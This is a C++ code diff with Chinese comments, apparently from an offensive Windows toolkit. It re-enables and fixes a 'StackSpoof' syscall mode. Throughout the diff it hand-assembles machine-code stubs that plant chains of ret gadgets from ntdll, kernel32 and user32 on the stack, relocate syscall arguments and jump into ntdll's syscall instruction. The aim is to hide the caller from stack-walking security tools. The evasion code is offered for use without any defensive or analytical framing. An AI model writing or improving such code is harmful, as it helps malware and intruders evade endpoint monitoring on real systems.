@@ -543,6 +543,10 @@ std::vector<uintptr_t> GetRetGadgets(size_t count) {
 
     if (!s_initialized) {
         FindRetGadgets(s_cachedGadgets, count);
+        // 通知 SyscallResolver StackSpoof 组件已就绪
+        if (s_cachedGadgets.size() >= 4) {
+            SyscallResolver::Instance().SetStackSpoofReady(true);
+        }
         s_initialized = true;
     }
 
@@ -652,10 +656,14 @@ SyscallMethod DecideMethod(SyscallMethod requested) {
         return SyscallMethod::Indirect;
     }
 
-    // StackSpoof (ret-sled push 实现) 暂时禁用: 
-    // push N 个 ret gadget 后栈偏移 N*8, ≥5 参数的 syscall 第5参数位置错位到只读区
-    // TODO: 改用 sub rsp + mov 实现 ret 链后重新启用
-    // 优先使用间接 syscall
+    // v3.24: StackSpoof 已修复 — 改用 sub rsp + mov + arg5重定位
+    // 修复前: push 导致 rsp 偏移, ≥5参数 syscall 的 arg5 错位到只读区 → ACCESS_VIOLATION
+    // 修复后: sub rsp 统一分配空间 + 重定位 arg5 到 [rsp+0x28]
+    if (resolver.GetSyscallRetGadget() && resolver.IsStackSpoofReady()) {
+        return SyscallMethod::StackSpoof;
+    }
+
+    // 非 StackSpoof 环境: 使用间接 syscall
     if (resolver.GetSyscallRetGadget()) {
         return SyscallMethod::Indirect;
     }
@@ -757,27 +765,18 @@ void* GenerateSpoofedSyscallStub(DWORD ssn, uintptr_t syscallRetGadget,
 }
 
 // ============================================================
-// GenerateDeepSpoofStub — 深度栈伪造 syscall stub (ret-sled 技术)
+// GenerateDeepSpoofStub — 深度栈伪造 syscall stub (v3.24 sub rsp + mov 修复版)
 //
-// 原理:
-//   1. pop rax 保存真实返回地址到寄存器
-//   2. push rax 把真实返回地址推到栈底 (所有伪造帧之下)
-//   3. 依次 push 32 个伪造的 ret gadget 地址到栈上
-//      (来自 ntdll/kernel32/user32 合法模块中的 ret 指令)
-//   4. 设置 syscall 参数, jmp 到 ntdll 的 syscall;ret gadget
-//   5. syscall 执行后, ntdll 的 ret 弹出栈顶第一个伪造帧
-//   6. 每个伪造帧都是 ret 指令, 依次弹出下一个伪造帧
-//   7. 32 层 pop 后到达真实返回地址, 正常返回
+// 修复: push→sub rsp+mov, arg5+arg6 重定位解决 ≥5 参数 syscall 崩溃
 //
-// 栈布局 (从顶到底, syscall;ret 执行时):
-//   gadget[31]  ← ntdll ret 从这里开始弹出
-//   gadget[30]
-//   ...
-//   gadget[0]
-//   real_ret_addr ← 最终返回到这里 (调用者)
-//
-// RtlVirtualUnwind 回溯: 看见 ntdll(ret)→kernel32(ret)→user32(ret)→...
-// 而非我们的 VirtualAlloc 内存
+// 栈布局 (syscall 执行时):
+//   [rsp+0x00] = gadget[0]     ← ret 弹出链
+//   [rsp+0x08] = gadget[1]
+//   [rsp+0x10] = gadget[2]
+//   [rsp+0x18] = gadget[3]
+//   [rsp+0x20] = real_ret      ← 最终返回调用者
+//   [rsp+0x28] = arg5 (重定位后)
+//   [rsp+0x30] = arg6 (重定位后)
 // ============================================================
 void* GenerateDeepSpoofStub(DWORD ssn, uintptr_t syscallRetGadget,
                              const std::vector<uintptr_t>& retGadgets,
@@ -788,36 +787,102 @@ void* GenerateDeepSpoofStub(DWORD ssn, uintptr_t syscallRetGadget,
     size_t chainCount = std::min(retGadgets.size(), (size_t)4);
     if (chainCount < 4) return nullptr;
 
-    const size_t codeHeaderSize = 1 + 1 + 3 + 5 + 7 + 3;
-    const size_t totalCodeSize = codeHeaderSize + chainCount * 6;
+    // 代码布局 (107 字节，支持 arg5+arg6 重定位):
+    // [0]   5A                pop rdx
+    // [1]   48 83 EC 28       sub rsp, 0x28
+    // [5]   48 8B 84 24 48 00 00 00  mov rax, [rsp+0x48]  ; 读 arg5
+    // [13]  48 89 84 24 28 00 00 00  mov [rsp+0x28], rax ; 写 arg5
+    // [21]  48 8B 84 24 50 00 00 00  mov rax, [rsp+0x50]  ; 读 arg6
+    // [29]  48 89 84 24 30 00 00 00  mov [rsp+0x30], rax ; 写 arg6
+    // [37]  48 8B 05 +disp_g0       mov rax, [rip+disp]   ; gadget[0]
+    // [44]  48 89 04 24             mov [rsp+0x00], rax
+    // [48]  48 8B 05 +disp_g1       mov rax, [rip+disp]   ; gadget[1]
+    // [55]  48 89 44 24 08          mov [rsp+0x08], rax
+    // [60]  48 8B 05 +disp_g2       mov rax, [rip+disp]   ; gadget[2]
+    // [67]  48 89 44 24 10          mov [rsp+0x10], rax
+    // [72]  48 8B 05 +disp_g3       mov rax, [rip+disp]   ; gadget[3]
+    // [79]  48 89 44 24 18          mov [rsp+0x18], rax
+    // [84]  48 89 54 24 20          mov [rsp+0x20], rdx   ; 真实返回
+    // [89]  4C 8B D1                mov r10, rcx
+    // [92]  B8 +SSN                 mov eax, SSN
+    // [97]  4C 8B 1D +disp_sys      mov r11, [rip+disp]   ; syscall;ret
+    // [104] 41 FF E3                jmp r11
+    const size_t totalCodeSize = 107;
     const size_t dataSectionSize = (chainCount + 1) * 8;
     const size_t totalSize = totalCodeSize + dataSectionSize;
 
     std::vector<BYTE> stub(totalSize, 0x90);
-
     BYTE* codePtr = stub.data();
     BYTE* dataPtr = stub.data() + totalCodeSize;
 
-    // ---- 代码段 ----
-    size_t offset = 0;
+    size_t off = 0;
 
-    codePtr[offset++] = 0x58;                         // pop rax
-    codePtr[offset++] = 0x50;                         // push rax
+    // --- pop rdx (save real return) ---
+    codePtr[off++] = 0x5A;
 
+    // --- sub rsp, 0x28 ---
+    codePtr[off++] = 0x48; codePtr[off++] = 0x83;
+    codePtr[off++] = 0xEC; codePtr[off++] = 0x28;
+
+    // --- fix arg5: mov rax, [rsp+0x48]; mov [rsp+0x28], rax ---
+    codePtr[off++] = 0x48; codePtr[off++] = 0x8B;
+    codePtr[off++] = 0x84; codePtr[off++] = 0x24;
+    codePtr[off++] = 0x48; codePtr[off++] = 0x00;
+    codePtr[off++] = 0x00; codePtr[off++] = 0x00;
+
+    codePtr[off++] = 0x48; codePtr[off++] = 0x89;
+    codePtr[off++] = 0x84; codePtr[off++] = 0x24;
+    codePtr[off++] = 0x28; codePtr[off++] = 0x00;
+    codePtr[off++] = 0x00; codePtr[off++] = 0x00;
+
+    // --- fix arg6: mov rax, [rsp+0x50]; mov [rsp+0x30], rax ---
+    codePtr[off++] = 0x48; codePtr[off++] = 0x8B;
+    codePtr[off++] = 0x84; codePtr[off++] = 0x24;
+    codePtr[off++] = 0x50; codePtr[off++] = 0x00;
+    codePtr[off++] = 0x00; codePtr[off++] = 0x00;
+
+    codePtr[off++] = 0x48; codePtr[off++] = 0x89;
+    codePtr[off++] = 0x84; codePtr[off++] = 0x24;
+    codePtr[off++] = 0x30; codePtr[off++] = 0x00;
+    codePtr[off++] = 0x00; codePtr[off++] = 0x00;
+
+    // --- for each gadget: mov rax, [rip+disp]; mov [rsp+i*8], rax ---
     for (size_t i = 0; i < chainCount; i++) {
-        codePtr[offset++] = 0xFF;                     // push [rip+disp32]
-        codePtr[offset++] = 0x35;
-        int32_t disp = static_cast<int32_t>(totalCodeSize - offset - 4 + i * 8);
-        *reinterpret_cast<int32_t*>(codePtr + offset) = disp;
-        offset += 4;
+        codePtr[off++] = 0x48; codePtr[off++] = 0x8B; codePtr[off++] = 0x05;
+        int32_t disp = static_cast<int32_t>(totalCodeSize - off - 4 + i * 8);
+        *reinterpret_cast<int32_t*>(codePtr + off) = disp;
+        off += 4;
+
+        if (i == 0) {
+            codePtr[off++] = 0x48; codePtr[off++] = 0x89;
+            codePtr[off++] = 0x04; codePtr[off++] = 0x24;
+        } else {
+            codePtr[off++] = 0x48; codePtr[off++] = 0x89;
+            codePtr[off++] = 0x44; codePtr[off++] = 0x24;
+            codePtr[off++] = static_cast<BYTE>(i * 8);
+        }
     }
 
-    codePtr[offset++] = 0x4C; codePtr[offset++] = 0x8B; codePtr[offset++] = 0xD1; // mov r10, rcx
-    codePtr[offset++] = 0xB8; *reinterpret_cast<DWORD*>(codePtr + offset) = ssn; offset += 4; // mov eax, SSN
-    codePtr[offset++] = 0x4C; codePtr[offset++] = 0x8B; codePtr[offset++] = 0x1D; // mov r11, [rip+disp]
-    int32_t syscDisp = static_cast<int32_t>(totalCodeSize + chainCount * 8 - offset - 4);
-    *reinterpret_cast<int32_t*>(codePtr + offset) = syscDisp; offset += 4;
-    codePtr[offset++] = 0x41; codePtr[offset++] = 0xFF; codePtr[offset++] = 0xE3; // jmp r11
+    // --- mov [rsp+0x20], rdx ---
+    codePtr[off++] = 0x48; codePtr[off++] = 0x89;
+    codePtr[off++] = 0x54; codePtr[off++] = 0x24;
+    codePtr[off++] = 0x20;
+
+    // --- mov r10, rcx ---
+    codePtr[off++] = 0x4C; codePtr[off++] = 0x8B; codePtr[off++] = 0xD1;
+
+    // --- mov eax, SSN ---
+    codePtr[off++] = 0xB8;
+    *reinterpret_cast<DWORD*>(codePtr + off) = ssn;
+    off += 4;
+
+    // --- mov r11, [rip+disp]; jmp r11 ---
+    codePtr[off++] = 0x4C; codePtr[off++] = 0x8B; codePtr[off++] = 0x1D;
+    int32_t syscDisp = static_cast<int32_t>(totalCodeSize + chainCount * 8 - off - 4);
+    *reinterpret_cast<int32_t*>(codePtr + off) = syscDisp;
+    off += 4;
+
+    codePtr[off++] = 0x41; codePtr[off++] = 0xFF; codePtr[off++] = 0xE3;
 
     // ---- 数据段 ----
     for (size_t i = 0; i < chainCount; i++)
